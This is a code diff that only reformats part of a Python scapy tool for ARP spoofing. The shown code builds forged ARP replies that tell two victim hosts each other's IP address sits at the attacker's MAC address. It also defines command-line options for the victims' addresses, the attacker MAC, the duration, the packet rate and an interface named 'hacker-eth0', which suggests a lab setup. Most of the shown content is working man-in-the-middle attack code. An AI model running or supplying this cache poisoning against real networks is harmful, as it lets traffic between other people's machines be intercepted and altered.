@@ -72,27 +72,21 @@ def arp_spoof(
     )
 
     # Tell victim_a: "victim_b's IP is at attacker_mac"
-    poison_a = (
-        scapy.Ether(dst=victim_a_mac, src=attacker_mac)
-        / scapy.ARP(
-            op=2,
-            hwsrc=attacker_mac,
-            psrc=str(victim_b_ip),
-            hwdst=victim_a_mac,
-            pdst=str(victim_a_ip),
-        )
+    poison_a = scapy.Ether(dst=victim_a_mac, src=attacker_mac) / scapy.ARP(
+        op=2,
+        hwsrc=attacker_mac,
+        psrc=str(victim_b_ip),
+        hwdst=victim_a_mac,
+        pdst=str(victim_a_ip),
     )
 
     # Tell victim_b: "victim_a's IP is at attacker_mac"
-    poison_b = (
-        scapy.Ether(dst=victim_b_mac, src=attacker_mac)
-        / scapy.ARP(
-            op=2,
-            hwsrc=attacker_mac,
-            psrc=str(victim_a_ip),
-            hwdst=victim_b_mac,
-            pdst=str(victim_b_ip),
-        )
+    poison_b = scapy.Ether(dst=victim_b_mac, src=attacker_mac) / scapy.ARP(
+        op=2,
+        hwsrc=attacker_mac,
+        psrc=str(victim_a_ip),
+        hwdst=victim_b_mac,
+        pdst=str(victim_b_ip),
     )
 
     while time.monotonic() < end_time:
@@ -111,43 +105,59 @@ def _build_parser() -> argparse.ArgumentParser:
         formatter_class=argparse.ArgumentDefaultsHelpFormatter,
     )
     parser.add_argument(
-        "-vai", "--victim-a-ip",
-        required=True, type=IPv4Address,
+        "-vai",
+        "--victim-a-ip",
+        required=True,
+        type=IPv4Address,
         help="First victim IPv4 address",
     )
     parser.add_argument(
-        "-vam", "--victim-a-mac",
-        required=True, type=str,
+        "-vam",
+        "--victim-a-mac",
+        required=True,
+        type=str,
         help="First victim MAC address",
     )
     parser.add_argument(
-        "-vbi", "--victim-b-ip",
-        required=True, type=IPv4Address,
+        "-vbi",
+        "--victim-b-ip",
+        required=True,
+        type=IPv4Address,
         help="Second victim IPv4 address",
     )
     parser.add_argument(
-        "-vbm", "--victim-b-mac",
-        required=True, type=str,
+        "-vbm",
+        "--victim-b-mac",
+        required=True,
+        type=str,
         help="Second victim MAC address",
     )
     parser.add_argument(
-        "-am", "--attacker-mac",
-        required=True, type=str,
+        "-am",
+        "--attacker-mac",
+        required=True,
+        type=str,
         help="Attacker MAC address to inject into victim ARP caches",
     )
     parser.add_argument(
-        "-d", "--duration",
-        type=int, default=DEFAULT_ARP_SPOOF_DURATION_SEC,
+        "-d",
+        "--duration",
+        type=int,
+        default=DEFAULT_ARP_SPOOF_DURATION_SEC,
         help="Spoof duration in seconds",
     )
     parser.add_argument(
-        "-p", "--pps",
-        type=int, default=DEFAULT_ARP_SPOOF_PPS,
+        "-p",
+        "--pps",
+        type=int,
+        default=DEFAULT_ARP_SPOOF_PPS,
         help="ARP reply pairs per second",
     )
     parser.add_argument(
-        "-i", "--interface",
-        type=str, default="hacker-eth0",
+        "-i",
+        "--interface",
+        type=str,
+        default="hacker-eth0",
         help="Egress interface (required for L2 injection)",
     )
     return parser
